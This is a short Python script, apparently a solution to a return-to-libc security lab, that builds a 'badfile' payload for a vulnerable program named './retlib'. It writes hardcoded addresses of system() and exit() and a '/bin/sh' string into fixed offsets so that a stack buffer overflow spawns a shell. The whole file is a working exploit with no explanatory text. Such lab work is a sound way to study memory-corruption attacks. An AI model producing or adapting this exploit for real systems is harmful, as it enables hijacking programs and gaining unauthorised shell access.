#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(48))

X = 36
#sh_addr = 0xffffcd40 + 40  # buffer of absolute path execution
sh_addr = 0xffffcdd0 + 40  # buffer of normal execution ./retlib
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 28
system_addr = 0xf7e12420   # The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 32
exit_addr = 0xf7e04f80     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

content[40:40 + 8] = bytearray(b'/bin/sh\x00')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
  